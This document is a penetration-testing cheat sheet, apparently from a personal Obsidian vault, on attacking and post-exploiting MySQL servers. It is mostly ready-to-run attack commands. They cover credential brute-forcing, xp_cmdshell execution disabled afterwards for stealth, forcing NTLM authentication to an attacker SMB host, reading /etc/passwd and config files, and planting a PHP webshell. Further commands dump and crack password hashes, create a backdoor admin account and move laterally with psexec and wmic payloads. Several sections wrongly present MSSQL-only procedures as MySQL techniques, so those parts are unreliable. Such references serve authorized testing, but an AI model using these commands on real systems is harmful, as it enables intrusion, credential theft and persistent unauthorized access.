---
id: Exploitation
aliases: []
tags:
  - Networking/Services/MySQL/Exploitation
---

<!-- Exploitation {{{-->
# Exploitation

<!-- Credentials {{{-->
## Credentials

<!-- Common Credentials {{{-->
### Common Credentials

Enumerate with [[Enumeration#Nmap|]] for common credentials
(*e.g.  `admin`, `administrator`, `root`, `user`, `test`, etc.*)

```sh
mysql -u <username> -p
```

<!-- }}} -->

<!-- Brute Force {{{-->
### Brute Force

Brute force credentials with [[Hydra]]

```sh
hydra -L <users.txt> -P <passwords.txt> -f [-S port] mysql://<target>
```

Brute force credentials with [[Metasploit]]'s MySQL Login Utility
([mysql_login](https://www.rapid7.com/db/modules/auxiliary/scanner/mysql/mysql_login/))

```sh
use auxiliary/scanner/mysql/mysql_login
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> msf > use auxiliary/scanner/mysql/mysql_login
> msf auxiliary(mysql_login) > show actions
>     ...actions...
> msf auxiliary(mysql_login) > set ACTION < action-name >
> msf auxiliary(mysql_login) > show options
>     ...show and set options...
> msf auxiliary(mysql_login) > run
> ```
>
> ```sh
> use auxiliary/scanner/mysql/mysql_login
> msf auxiliary(scanner/mysql/mysql_login) > set rhosts X.X.X.X
> msf auxiliary(scanner/mysql/mysql_login) > set user_file /path/to/user.txt
> msf auxiliary(scanner/mysql/mysql_login) > set pass_file /path/to/pass.txt
> msf auxiliary(scanner/mysql/mysql_login) > set stop_on_success true
> msf auxiliary(scanner/mysql/mysql_login) > exploit
> ```
<!-- }}} -->

<!-- }}} -->

___

<!-- }}} -->

<!-- Command Execution {{{-->
## Command Execution

Enabling `xp_cmdshell` (*requires sysadmin*)

```sh
EXEC sp_configure 'xp_cmdshell', 1;
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> EXEC sp_configure 'show advanced options', 1;
> ```
> ```sh
> RECONFIGURE;
> ```
> ```sh
> EXEC sp_configure 'xp_cmdshell', 1;
> ```
> ```sh
> RECONFIGURE;
> ```
<!-- }}} -->

Execute a command

```sh
EXEC xp_cmdshell '<command>';
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> EXEC xp_cmdshell 'whoami';
> ```
> ```sh
> EXEC master..xp_cmdshell 'ipconfig';
> ```
> ```sh
> EXEC xp_cmdshell 'net user';
> ```
<!-- }}} -->

Disable xp_cmdshell (*optional, for stealth*)

```sh
EXEC sp_configure 'xp_cmdshell', 0;
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> EXEC sp_configure 'xp_cmdshell', 0;
> ```
> ```sh
> RECONFIGURE;
> ```
<!-- }}} -->

___

<!-- }}} -->

<!-- Capture NTLM Service Hash {{{-->
## Capture NTLM Service Hash

Capture NTLM hashes by forcing MSSQL to authenticate
to attacker-controlled SMB shares

1. Start [responder](https://github.com/lgandx/Responder)
   on the attacker machine

```sh
sudo responder -I eth0
```

2. Authenticate to the attacker machine

<!-- Example {{{-->
> [!example]-
>
> Call extended stored procedures on the target machine
>
> ```sh
> EXEC xp_dirtree '\\<attacker_ip>\<share>';
> ```
>
> ```sh
> EXEC xp_fileexist '\\<attacker_ip>\<share>\<file>';
> ```
>
> ```sh
> EXEC master..xp_subdirs '\\<attacker_ip>\<share>';
> ```
<!-- }}} -->

### Hash Cracking

Crack NTLM hash with [[Hashcat]]

```sh
hashcat -m 5600 <hash.txt> <rockyou.txt>
```

___

<!-- }}} -->

<!-- }}} -->

<!-- Post-Exploitation {{{-->
# Post-Exploitation

<!-- Enumeration {{{-->
## Enumeration

<!-- Version Info {{{-->
### Version Info

Show MySQL version

```sh
SELECT @@version;
```

```sh
SELECT VERSION();
```

Show server version

```sql
SELECT @@version_compile_os;
```

```sh
SELECT @@version_compile_machine;
```

```sh
SHOW VARIABLES LIKE "%version%";
```

<!-- }}} -->

<!-- User {{{-->
### User

Show current user

```sql
SELECT USER();
```

```sql
SELECT CURRENT_USER();
```

List MySQL users

```sql
SELECT user, host FROM mysql.user;
```

<!-- Privileges {{{-->
#### Privileges

Show user privileges

```sql
SHOW GRANTS;
```

```sql
SHOW GRANTS FOR '<username>'@'<host>';
```

List users with `FILE` privilege

```sql
SELECT user, host FROM mysql.user WHERE File_priv = 'Y';
```

List users with `SUPER` privilege

```sql
SELECT user, host FROM mysql.user WHERE Super_priv = 'Y';
```

<!-- }}} -->

<!-- }}} -->

<!-- Configuration {{{-->
### Configuration

Show important variables

```sh
SHOW VARIABLES;
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> SHOW VARIABLES LIKE 'secure_file_priv';  # File operations directory
> SHOW VARIABLES LIKE 'plugin_dir';        # Plugin directory
> SHOW VARIABLES LIKE 'datadir';           # Data directory
> SHOW VARIABLES LIKE 'basedir';           # Base directory
> ```
<!-- }}} -->

Check if `local_infile` enabled

```sh
SHOW VARIABLES LIKE 'local_infile';
```

<!-- Info {{{-->
> [!info]-
>
> Enabling `local_infile` allows loading data from local files
> (*attacker machine*) via the `LOAD DATA LOCAL INFILE` statement
>
> > [!example]-
> >
> > ```sh
> > LOAD DATA LOCAL INFILE '<data.csv>' INTO TABLE my_table;
> > ```
<!-- }}} -->

Process list

```sh
SHOW PROCESSLIST;
```

<!-- Info {{{-->
> [!info]-
>
> `SHOW PROCESSLIST;` may reveal
>
> - **Active queries** — (*e.g., password checks, file paths, etc.*)
> - **Usernames & Hosts** — Shows who is connected
> - **Database Names** — Visible in the `db` column
<!-- }}} -->

<!-- }}} -->

___

<!-- }}} -->

<!-- Data Exfiltration {{{-->
## Data Exfiltration

Extract sensitive data

```sql
SELECT * FROM <table>;
```

<!-- Example {{{-->
> [!example]-
>
> Select every user with `admin` role
>
> ```sql
> SELECT * FROM users WHERE role='admin';
> ```
>
> Select every important attribute
>
> ```sql
> SELECT username, password, email FROM accounts;
> ```
<!-- }}} -->

Export database to file

```sql
SELECT * FROM <table> INTO OUTFILE '<file>' FIELDS TERMINATED BY ',' ENCLOSED BY '"' LINES TERMINATED BY '\n';
```
Concatenate and export

```sql
SELECT CONCAT(username, ':', password) FROM users INTO OUTFILE '<file>';
```
___

<!-- }}} -->

<!-- File Operations {{{-->
## File Operations

<!-- Read Files {{{-->
### Read Files

Read files from the server (*with* `FILE` *privileges*)

```sh
SELECT LOAD_FILE('/path/to/file');
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> SELECT LOAD_FILE('/etc/passwd');
> ```
>
> ```
> SELECT LOAD_FILE('/var/www/html/config.php');
> ```
>
> ```sh
> SELECT LOAD_FILE('C:\\Windows\\win.ini');
> ```
>
> > [!tip]
> >
> > Read file with hex encoding (*bypasses binary issues*)
> >
> > ```sh
> > SELECT HEX(LOAD_FILE('/etc/passwd'));
> > ```
<!-- }}} -->


<!-- }}} -->

<!-- Write Files {{{-->
### Write Files

Write files to the server (*with* `FILE` *privileges*)

```sql
SELECT '<content>' INTO OUTFILE '<file>';
```

<!-- Example {{{-->
> [!example]-
>
> Upload a PHP webshell
>
> ```sql
> SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
> ```
<!-- }}} -->

<!-- }}} -->

___

<!-- }}} -->

<!-- Password Hash {{{-->
## Password Hash

<!-- Extraction {{{-->
### Extraction

Extract password hashes (*MySQL < 5.7*)

```sql
SELECT user, password FROM mysql.user;
```

Extract password hashes (*MySQL >= 5.7*)

```sql
SELECT user, authentication_string FROM mysql.user;
```

Specific user hash (*e.g. `root`*)

```sql
SELECT authentication_string FROM mysql.user WHERE user='root';
```

Export hashes to file

```sql
SELECT user, authentication_string FROM mysql.user INTO OUTFILE '/tmp/hashes.txt';
```
<!-- }}} -->

<!-- Cracking {{{-->
### Cracking

Extract hashes

```sh
mysql -u root -p -e "SELECT CONCAT(user, ':', authentication_string) FROM mysql.user" > mysql_hashes.txt
```

Crack hashes with [[Hashcat]] (*MySQL 4.1/MySQL 5+*)

```sh
hashcat -m 300 <mysql_hashes.txt> <rockyou.txt>
```

> [!info]-
>
> - `-m 300`: Mode `300` (MySQL4.1/MySQL5)

Crack hashes with [[Hashcat]] (*MySQL pre-4.1*)

```sh
hashcat -m 200 <old_mysql_hash.txt> <rockyou.txt>
```

> [!info]-
>
> - `-m 200`: Mode `200` (MySQL323)

Crack hashes with [[John The Ripper]]

```sh
john --format=mysql-sha1 <mysql_hashes.txt>
```

<!-- }}} -->

___

<!-- }}} -->

<!-- Privilege Escalation {{{-->
## Privilege Escalation

Create new admin user

<!-- Example {{{-->
> [!example]-
>
> 1. Create a new user account
>
> ```sql
> CREATE USER '<user>'@'%' IDENTIFIED BY '<password>';
> ```
>
> 2. Grant full privileges on databases and tables
>
> ```sql
> GRANT ALL PRIVILEGES ON *.* TO '<user>'@'%' WITH GRANT OPTION;
> ```
>
> 3. Reload privilege tables
>
> ```sql
> FLUSH PRIVILEGES;
> ```
<!-- }}} -->

Modify existing user password

<!-- Example {{{-->
> [!example]-
>
> 1. Change the stored password hash for the `root` entry
>
> ```sql
> UPDATE mysql.user SET password=PASSWORD('<new_password>') WHERE user='root';
> ```
>
> 2. Reload privilege tables
>
> ```sh
> FLUSH PRIVILEGES;
> ```
<!-- }}} -->

Grant `FILE` privilege to user

<!-- Example {{{-->
> [!example]-
>
> 1. Grant `FILE` privilege to the user
>
> ```sql
> GRANT FILE ON *.* TO '<user>'@'localhost';
> ```
>
> 2. Reload privilege tables
>
> ```sql
> FLUSH PRIVILEGES;
> ```
<!-- }}} -->

___

<!-- }}} -->

<!-- Lateral Movement {{{-->
## Lateral Movement

Move laterally through the network using MSSQL access

```sh
EXEC xp_cmdshell 'psexec \\target-host -u domain\admin -p password cmd.exe';
```

WMI lateral movement

```sh
EXEC xp_cmdshell 'wmic /node:target-host process call create "cmd.exe /c payload.exe"';
```

<!-- }}} -->

<!-- }}} -->
